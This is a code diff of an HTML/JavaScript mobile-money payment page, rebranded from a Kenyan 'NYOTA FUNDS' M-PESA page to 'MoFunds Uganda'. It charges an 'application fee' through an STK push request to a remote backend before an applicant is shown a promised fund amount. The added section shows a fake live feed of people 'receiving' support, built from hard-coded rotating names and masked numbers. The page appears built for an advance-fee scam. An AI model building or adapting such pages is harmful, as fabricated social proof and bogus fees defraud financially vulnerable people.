@@ -3,140 +3,187 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="theme-color" content="#0B0217">
-<title>NYOTA FUNDS — Payment</title>
+<meta name="theme-color" content="#FFD100">
+<title>MoFunds Uganda — Payment</title>
 
 <style>
-*{box-sizing:border-box}
+*{margin:0;padding:0;box-sizing:border-box;}
 
 body{
-    margin:0;
-    min-height:100vh;
-    padding:16px 10px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-family:Arial,sans-serif;
-    background:#0B0217;
-    color:#fff;
+font-family:Arial,sans-serif;
+min-height:100vh;
+padding:12px;
+background:
+radial-gradient(circle at 10% 10%,rgba(255,209,0,.35),transparent 28%),
+radial-gradient(circle at 90% 90%,rgba(245,176,0,.35),transparent 28%),
+linear-gradient(135deg,#FFD100,#F5B000);
+color:#000;
 }
 
-.container{
-    width:100%;
-    max-width:430px;
-}
+.container{width:100%;max-width:420px;margin:auto;}
 
 .card{
-    width:100%;
-    padding:22px 18px 18px;
-    border-radius:18px;
-    background:
-        linear-gradient(
-            145deg,
-            rgba(255,255,255,.09),
-            rgba(255,255,255,.035)
-        );
-    border:1px solid rgba(255,255,255,.10);
-    box-shadow:
-        0 20px 60px rgba(0,0,0,.45),
-        inset 0 1px 0 rgba(255,255,255,.05);
+padding:20px 16px;
+border-radius:20px;
+background:rgba(255,255,255,.95);
+border:1px solid rgba(0,0,0,.08);
+backdrop-filter:blur(14px);
+box-shadow:0 18px 40px rgba(0,0,0,.25);
 }
 
-h1{
-    text-align:center;
-    font-size:22px;
-    margin:2px 0 8px;
-}
+h1{text-align:center;font-size:24px;margin-bottom:8px;}
 
-p{
-    font-size:14px;
-    line-height:1.5;
-    color:rgba(255,255,255,.72);
-    text-align:center;
-}
+p{text-align:center;font-size:14px;line-height:1.5;color:#444;}
 
 .amount{
-    margin:18px 0;
-    padding:14px 10px;
-    border-radius:12px;
-    text-align:center;
-    font-size:20px;
-    font-weight:700;
-    background:rgba(155,53,255,.08);
-    border:1px solid rgba(155,53,255,.18);
+margin:18px 0;
+padding:14px;
+border-radius:12px;
+text-align:center;
+font-size:20px;
+font-weight:bold;
+background:rgba(255,209,0,.18);
+border:1px solid rgba(0,0,0,.12);
 }
 
+.money{color:#000;}
+
 label{
-    display:block;
-    margin:15px 0 7px;
-    font-size:14px;
-    font-weight:700;
-    color:rgba(255,255,255,.88);
+display:block;
+margin:14px 0 6px;
+font-weight:bold;
+font-size:14px;
 }
 
 input{
-    width:100%;
-    padding:14px 12px;
-    border-radius:10px;
-    border:1px solid rgba(255,255,255,.12);
-    background:rgba(255,255,255,.07);
-    color:#fff;
-    font-size:16px;
-    outline:none;
+width:100%;
+padding:13px;
+border-radius:10px;
+border:1px solid rgba(0,0,0,.15);
+background:#fff;
+color:#000;
+font-size:16px;
+outline:none;
 }
 
 input:focus{
-    border-color:rgba(169,72,255,.8);
-    box-shadow:0 0 0 3px rgba(155,55,255,.12);
-}
-
-input[readonly]{
-    opacity:.75;
+border-color:#000;
+box-shadow:0 0 0 3px rgba(255,209,0,.25);
 }
 
 button{
-    width:100%;
-    padding:15px;
-    margin-top:17px;
-    border:0;
-    border-radius:11px;
-    background:linear-gradient(135deg,#9B35FF,#6C1DCE);
-    color:#fff;
-    font-size:16px;
-    font-weight:700;
-    cursor:pointer;
-    box-shadow:0 10px 30px rgba(137,43,226,.30);
+width:100%;
+padding:14px;
+margin-top:18px;
+border:none;
+border-radius:11px;
+background:linear-gradient(135deg,#000,#222);
+color:#FFD100;
+font-size:16px;
+font-weight:bold;
+cursor:pointer;
+box-shadow:0 10px 25px rgba(0,0,0,.25);
+transition:.25s;
 }
 
-button:hover{
-    background:linear-gradient(135deg,#A844FF,#7625DC);
-}
-
-button:disabled{
-    background:rgba(255,255,255,.25);
-    cursor:not-allowed;
-    box-shadow:none;
-}
+button:hover{transform:translateY(-2px);}
+button:disabled{opacity:.6;cursor:not-allowed;box-shadow:none;transform:none;}
 
 #stkMessage{
-    min-height:42px;
-    margin-top:13px;
-    color:#B86CFF;
-    font-size:13px;
-    font-weight:600;
+min-height:35px;
+margin-top:12px;
+text-align:center;
+font-size:13px;
+font-weight:600;
 }
 
-.success{
-    color:#6DFFAA !important;
-}
-
-.error{
-    color:#FF7D8A !important;
-}
+.success{color:#0A7A2A;}
+.error{color:#D32F2F;}
 
 .small{
-    font-size:12px !important;
-    color:rgba(255,255,255,.48) !important;
+margin-top:10px;
+font-size:12px;
+color:#666;
+}
+
+.live-comments{
+position:relative;
+margin-top:25px;
+padding:18px;
+border-radius:18px;
+background:rgba(255,255,255,.9);
+border:1px solid rgba(0,0,0,.08);
+overflow:hidden;
+}
+
+.live-comments h3{
+text-align:center;
+font-size:17px;
+margin-bottom:15px;
+position:relative;
+z-index:2;
+}
+
+.live-comment{
+display:flex;
+align-items:center;
+gap:10px;
+padding:12px;
+margin-bottom:10px;
+border-radius:12px;
+background:rgba(255,209,0,.18);
+border:1px solid rgba(0,0,0,.12);
+position:relative;
+z-index:2;
+}
+
+.live-comment:last-child{margin-bottom:0;}
+
+.live-avatar{
+width:42px;
+height:42px;
+border-radius:50%;
+background:#000;
+color:#FFD100;
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:20px;
+flex-shrink:0;
+}
+
+.live-content strong{display:block;font-size:14px;}
+.live-content p{text-align:left;font-size:13px;margin:2px 0;color:#444;}
+.live-content b{color:#000;}
+.live-content small{font-size:11px;color:#666;}
+
+.flower-rain{
+position:absolute;
+top:42px;
+left:0;
+width:100%;
+height:170px;
+pointer-events:none;
+z-index:1;
+}
+
+.rain-flower{
+position:absolute;
+top:-30px;
+font-size:20px;
+animation:flowerFall linear forwards;
+}
+
+.footer{
+text-align:center;
+padding:14px;
+font-size:12px;
+color:#666;
+}
+
+@keyframes flowerFall{
+0%{transform:translateY(-20px) rotate(0deg);opacity:1;}
+100%{transform:translateY(190px) rotate(360deg);opacity:0;}
 }
 </style>
 </head>
@@ -144,663 +191,254 @@ button:disabled{
 <body>
 
 <div class="container">
-
 <div class="card">
 
-<h1>Processing Fee</h1>
+<h1>🌟 MOMO Funds Uganda</h1>
 
-<p>
-Welcome, <strong id="name">Applicant</strong>
-</p>
+<p>👋 Welcome, <strong id="name">Applicant</strong></p>
 
-<p>
-Please complete the payment below to continue.
-</p>
+<p>Please complete the application payment to continue.</p>
+
+<div class="amount" id="selectedAmountBox">
+💵 Selected Amount: <span class="money">UGX 0</span>
+</div>
 
 <div class="amount" id="feeAmount">
-Processing Fee: KSh 350
+🧾 Application Fee: <span class="money">UGX 450</span>
 </div>
 
-<label for="fullName">
-Full Name
-</label>
+<label>👤 Full Name</label>
+<input type="text" id="fullName" readonly>
 
-<input
-    type="text"
-    id="fullName"
-    readonly
->
+<label>📱 Phone Number</label>
+<input type="tel" id="phone" placeholder="2567XXXXXXXX" maxlength="12">
 
-<label for="phone">
-M-PESA Phone Number
-</label>
+<button id="payBtn">💳 Continue Payment</button>
 
-<input
-    type="tel"
-    id="phone"
-    inputmode="numeric"
-    autocomplete="tel"
-    placeholder="2547XXXXXXXX"
-    maxlength="12"
->
-
-<button
-    id="payBtn"
-    type="button"
->
-Pay Processing Fee
-</button>
-
-<p
-    id="stkMessage"
-    role="status"
-    aria-live="polite"
-></p>
+<div id="stkMessage"></div>
 
 <p class="small">
-You will receive an M-PESA prompt on the number entered above.
+📲 Follow the payment instructions on the phone number entered above.
 </p>
+
+<div class="live-comments">
+
+<h3>🎉 PEOPLE RECEIVING MOMO FUNDS UGANDA SUPPORT RIGHT NOW</h3>
+
+<div class="flower-rain" id="flowerRain"></div>
+
+<div class="live-comment">
+<div class="live-avatar">💰</div>
+<div class="live-content">
+<strong id="liveName1">Amina</strong>
+<p><span id="livePhone1">07*****95</span> completed an application</p>
+<small id="liveTime1">5s ago</small>
+</div>
+</div>
+
+<div class="live-comment">
+<div class="live-avatar">💰</div>
+<div class="live-content">
+<strong id="liveName2">Brian</strong>
+<p><span id="livePhone2">07*****28</span> completed an application</p>
+<small id="liveTime2">12s ago</small>
+</div>
+</div>
 
 </div>
 
+<div class="footer">
+© 2026 MoFunds Uganda
+</div>
+
+</div>
 </div>
 
 <script>
-
 "use strict";
 
-/*
- * IMPORTANT:
- *
- * PAYLOR_API_KEY
- * PAYLOR_WEBHOOK_SECRET
- * PAYLOR_CHANNEL_ID
- *
- * MUST NOT be placed in this HTML file.
- *
- * Keep them on your backend/server.
- */
+const BACKEND_URL="https://nyota-program-001-functionality-1.onrender.com";
 
-const BACKEND_URL =
-    "https://nyota-program-backend.onrender.com";
+const applicant=
+localStorage.getItem("fullName")||
+localStorage.getItem("fullname")||
+localStorage.getItem("applicantName")||
+"Applicant";
 
+const savedPhone=
+localStorage.getItem("phoneNumber")||
+localStorage.getItem("phone")||
+"";
 
-/* =========================
-   LOAD APPLICANT INFORMATION
-========================= */
+const processingFee=
+Number(localStorage.getItem("processingFee")||450);
 
-const applicant =
-    localStorage.getItem("applicantName") ||
-    "Applicant";
+const selectedAmount=
+Number(localStorage.getItem("selectedAmount")||0);
 
-const storedFee =
-    Number(
-        localStorage.getItem("processingFee") ||
-        "350"
-    );
+document.getElementById("name").textContent=applicant;
+document.getElementById("fullName").value=applicant;
+document.getElementById("phone").value=savedPhone;
 
-const processingFee =
-    Number.isFinite(storedFee) &&
-    storedFee > 0
-        ? storedFee
-        : 350;
+document.getElementById("selectedAmountBox").innerHTML=
+"💵 Selected Amount: <span class='money'>UGX "+selectedAmount.toLocaleString("en-UG")+"</span>";
 
+document.getElementById("feeAmount").innerHTML=
+"🧾 Application Fee: <span class='money'>UGX "+processingFee.toLocaleString("en-UG")+"</span>";
 
-document.getElementById("name")
-    .textContent = applicant;
+const phoneEl=document.getElementById("phone");
+const payBtn=document.getElementById("payBtn");
+const msg=document.getElementById("stkMessage");
 
-document.getElementById("fullName")
-    .value = applicant;
-
-document.getElementById("feeAmount")
-    .textContent =
-        "Processing Fee: KSh " +
-        processingFee.toLocaleString("en-KE");
-
-
-/* =========================
-   ELEMENTS
-========================= */
-
-const phoneEl =
-    document.getElementById("phone");
-
-const payBtn =
-    document.getElementById("payBtn");
-
-const messageEl =
-    document.getElementById("stkMessage");
-
-
-/* =========================
-   MESSAGE
-========================= */
-
-function setMessage(
-    message,
-    type = ""
-){
-
-    messageEl.textContent =
-        message;
-
-    messageEl.className =
-        type;
+function setMessage(text,type=""){
+msg.textContent=text;
+msg.className=type;
 }
 
-
-/* =========================
-   PHONE NORMALIZATION
-========================= */
+function setLoading(state,text){
+payBtn.disabled=state;
+payBtn.textContent=state?text:"💳 Continue Payment";
+}
 
 function normalizePhone(value){
-
-    let phone =
-        value.replace(
-            /[^\d+]/g,
-            ""
-        );
-
-    if(
-        phone.startsWith("+254")
-    ){
-
-        phone =
-            phone.slice(1);
-    }
-
-    if(
-        phone.startsWith("07") ||
-        phone.startsWith("01")
-    ){
-
-        phone =
-            "254" +
-            phone.slice(1);
-    }
-
-    return phone;
+let phone=value.replace(/[^\d+]/g,"");
+if(phone.startsWith("+256")) phone=phone.slice(1);
+if(phone.startsWith("07")) phone="256"+phone.slice(1);
+return phone;
 }
 
-
-/* =========================
-   PHONE VALIDATION
-========================= */
-
-function isValidKenyanPhone(
-    phone
-){
-
-    return /^254(?:7|1)\d{8}$/
-        .test(phone);
+async function readJson(res){
+const txt=await res.text();
+return txt?JSON.parse(txt):{};
 }
-
-
-/* =========================
-   BUTTON STATE
-========================= */
-
-function setLoading(
-    loading,
-    text = "Processing..."
-){
-
-    payBtn.disabled =
-        loading;
-
-    payBtn.textContent =
-        loading
-            ? text
-            : "Pay Processing Fee";
-}
-
-
-/* =========================
-   JSON RESPONSE
-========================= */
-
-async function readJson(
-    response
-){
-
-    const text =
-        await response.text();
-
-    try{
-
-        return text
-            ? JSON.parse(text)
-            : {};
-
-    }catch{
-
-        throw new Error(
-            "The server returned an invalid response."
-        );
-    }
-}
-
-
-/* =========================
-   START PAYMENT
-========================= */
 
 async function payNow(){
+const phone=normalizePhone(phoneEl.value.trim());
 
-    const phone =
-        normalizePhone(
-            phoneEl.value.trim()
-        );
-
-
-    if(
-        !isValidKenyanPhone(phone)
-    ){
-
-        setMessage(
-            "Enter a valid Kenyan M-PESA number, e.g. 254712345678.",
-            "error"
-        );
-
-        phoneEl.focus();
-
-        return;
-    }
-
-
-    localStorage.setItem(
-        "phoneNumber",
-        phone
-    );
-
-
-    localStorage.setItem(
-        "fullName",
-        document.getElementById(
-            "fullName"
-        ).value
-    );
-
-
-    setLoading(
-        true,
-        "Sending STK Push..."
-    );
-
-
-    setMessage(
-        "Sending an M-PESA payment request..."
-    );
-
-
-    try{
-
-        const response =
-            await fetch(
-                BACKEND_URL +
-                "/stk-push",
-                {
-
-                    method:"POST",
-
-                    headers:{
-                        "Content-Type":
-                            "application/json"
-                    },
-
-                    body:JSON.stringify({
-
-                        phone:phone,
-
-                        amount:
-                            processingFee
-
-                    })
-
-                }
-            );
-
-
-        const data =
-            await readJson(
-                response
-            );
-
-
-        console.log(
-            "STK RESPONSE:",
-            data
-        );
-
-
-        if(
-            !response.ok ||
-            !data.success
-        ){
-
-            throw new Error(
-                data.message ||
-                "STK Push failed."
-            );
-        }
-
-
-        /*
-         * Supports both:
-         *
-         * data.transactionId
-         *
-         * and
-         *
-         * data.checkout_request_id
-         */
-
-        const transactionId =
-
-            data.transactionId ||
-
-            data.checkout_request_id ||
-
-            data.data?.transactionId ||
-
-            data.data?.checkout_request_id;
-
-
-        if(!transactionId){
-
-            throw new Error(
-                "The server did not return a transaction ID."
-            );
-        }
-
-
-        setLoading(
-            true,
-            "Waiting for payment..."
-        );
-
-
-        setMessage(
-            "M-PESA prompt sent. Enter your M-PESA PIN on your phone to complete the payment."
-        );
-
-
-        await checkPayment(
-            transactionId
-        );
-
-
-    }catch(error){
-
-        console.error(
-            "PAYMENT ERROR:",
-            error
-        );
-
-
-        setMessage(
-            error.message ||
-            "Payment request failed.",
-            "error"
-        );
-
-
-        setLoading(
-            false
-        );
-    }
+if(!/^2567\d{8}$/.test(phone)){
+setMessage("Enter a valid Uganda phone number.","error");
+return;
 }
 
+localStorage.setItem("phoneNumber",phone);
 
-/* =========================
-   CHECK PAYMENT
-========================= */
+setLoading(true,"Processing...");
+setMessage("Sending payment request...");
 
-async function checkPayment(
-    transactionId
-){
+try{
+const response=await fetch(`${BACKEND_URL}/stk-push`,{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({phone,amount:processingFee})
+});
 
-    const startedAt =
-        Date.now();
+const data=await readJson(response);
 
-    const timeoutMs =
-        2 * 60 * 1000;
-
-
-    while(
-        Date.now() -
-        startedAt <
-        timeoutMs
-    ){
-
-        try{
-
-            const response =
-                await fetch(
-                    BACKEND_URL +
-                    "/payment-status",
-                    {
-
-                        method:"POST",
-
-                        headers:{
-                            "Content-Type":
-                                "application/json"
-                        },
-
-                        body:
-                            JSON.stringify({
-
-                                transactionId:
-                                    transactionId
-
-                            })
-
-                    }
-                );
-
-
-            const result =
-                await readJson(
-                    response
-                );
-
-
-            console.log(
-                "PAYMENT STATUS:",
-                result
-            );
-
-
-            if(
-                result.success &&
-                result.data
-            ){
-
-                const payment =
-                    result.data;
-
-
-                const status =
-                    String(
-                        payment.status ||
-                        ""
-                    ).toUpperCase();
-
-
-                /*
-                 * SUCCESS
-                 */
-
-                if(
-
-                    status ===
-                    "COMPLETED" ||
-
-                    status ===
-                    "SUCCESS" ||
-
-                    status ===
-                    "CONFIRMED"
-
-                ){
-
-                    setMessage(
-                        "Payment successful. Redirecting...",
-                        "success"
-                    );
-
-
-                    setTimeout(
-                        function(){
-
-                            window.location.href =
-                                "delivery.html";
-
-                        },
-                        800
-                    );
-
-
-                    return;
-                }
-
-
-                /*
-                 * FAILED
-                 */
-
-                if(
-
-                    status ===
-                    "CANCELLED" ||
-
-                    status ===
-                    "FAILED" ||
-
-                    status ===
-                    "EXPIRED"
-
-                ){
-
-                    throw new Error(
-                        "Payment " +
-                        status.toLowerCase() +
-                        "."
-                    );
-                }
-
-            }
-
-
-        }catch(error){
-
-            console.error(
-                "STATUS ERROR:",
-                error
-            );
-
-
-            if(
-
-                /cancelled|failed|expired/i
-                    .test(error.message)
-
-            ){
-
-                setMessage(
-                    error.message,
-                    "error"
-                );
-
-
-                setLoading(
-                    false
-                );
-
-
-                return;
-            }
-
-        }
-
-
-        /*
-         * Wait 3 seconds
-         * before checking again.
-         */
-
-        await new Promise(
-            resolve =>
-                setTimeout(
-                    resolve,
-                    3000
-                )
-        );
-    }
-
-
-    /*
-     * TIMEOUT
-     */
-
-    setMessage(
-        "We could not confirm the payment within the expected time. Check your M-PESA messages before trying again.",
-        "error"
-    );
-
-
-    setLoading(
-        false
-    );
+if(!response.ok||data.success===false){
+throw new Error(data.message||"Payment request failed.");
 }
 
+const transactionId=data.transactionId||data.data?.transactionId||data.checkout_request_id;
 
-/* =========================
-   BUTTON
-========================= */
+setLoading(true,"Waiting...");
+setMessage("Please complete the payment on your phone.");
 
-payBtn.addEventListener(
-    "click",
-    payNow
-);
+await checkPayment(transactionId);
 
+}catch(error){
+setMessage(error.message,"error");
+setLoading(false);
+}
+}
 
-/* =========================
-   PHONE INPUT
-========================= */
+async function checkPayment(transactionId){
+const start=Date.now();
 
-phoneEl.addEventListener(
-    "input",
-    function(){
+while(Date.now()-start<120000){
+try{
+const response=await fetch(`${BACKEND_URL}/payment-status`,{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({transactionId})
+});
 
-        phoneEl.value =
-            phoneEl.value.replace(
-                /[^\d+]/g,
-                ""
-            );
-    }
-);
+const result=await readJson(response);
+const status=String(result.data?.status||"").toUpperCase();
 
+if(["SUCCESS","COMPLETED","CONFIRMED"].includes(status)){
+setMessage("Payment successful. Redirecting...","success");
+setLoading(true,"Confirmed");
+setTimeout(()=>window.location.href="delivery.html",1000);
+return;
+}
 
-/* =========================
-   ENTER KEY
-========================= */
+if(["FAILED","CANCELLED","EXPIRED"].includes(status)){
+throw new Error("Payment "+status.toLowerCase()+".");
+}
 
-phoneEl.addEventListener(
-    "keydown",
-    function(event){
+}catch(error){
+if(/failed|cancelled|expired/i.test(error.message)){
+setMessage(error.message,"error");
+setLoading(false);
+return;
+}
+}
 
-        if(
-            event.key ===
-            "Enter"
-        ){
+await new Promise(r=>setTimeout(r,3000));
+}
 
-            payNow();
-        }
-    }
-);
+setMessage("Payment confirmation timed out.","error");
+setLoading(false);
+}
 
+payBtn.addEventListener("click",payNow);
+
+const rainContainer=document.getElementById("flowerRain");
+const flowerIcons=["🌸","🌺","🌹","🌼","💐","🌷"];
+
+function createRainFlower(){
+const flower=document.createElement("span");
+flower.className="rain-flower";
+flower.textContent=flowerIcons[Math.floor(Math.random()*flowerIcons.length)];
+flower.style.left=Math.random()*100+"%";
+flower.style.fontSize=(16+Math.random()*12)+"px";
+flower.style.animationDuration=(2+Math.random()*2)+"s";
+rainContainer.appendChild(flower);
+setTimeout(()=>flower.remove(),4000);
+}
+
+setInterval(createRainFlower,180);
+
+const livePeople=[
+["Amina","07*****37","Application submitted","3s ago"],
+["Brian","07*****47","Application submitted","19s ago"],
+["Grace","07*****65","Application submitted","16s ago"],
+["Sarah","07*****39","Application submitted","8s ago"],
+["John","07*****95","Application submitted","5s ago"],
+["David","07*****28","Application submitted","12s ago"],
+["Mary","07*****71","Application submitted","9s ago"],
+["Peter","07*****84","Application submitted","15s ago"]
+];
+
+let current=0;
+
+function updateLiveComments(){
+const p1=livePeople[current];
+const p2=livePeople[(current+1)%livePeople.length];
+
+liveName1.textContent=p1[0];
+livePhone1.textContent=p1[1];
+liveTime1.textContent=p1[3];
+
+liveName2.textContent=p2[0];
+livePhone2.textContent=p2[1];
+liveTime2.textContent=p2[3];
+
+current=(current+2)%livePeople.length;
+}
+
+updateLiveComments();
+setInterval(updateLiveComments,3000);
 </script>
 
 </body>
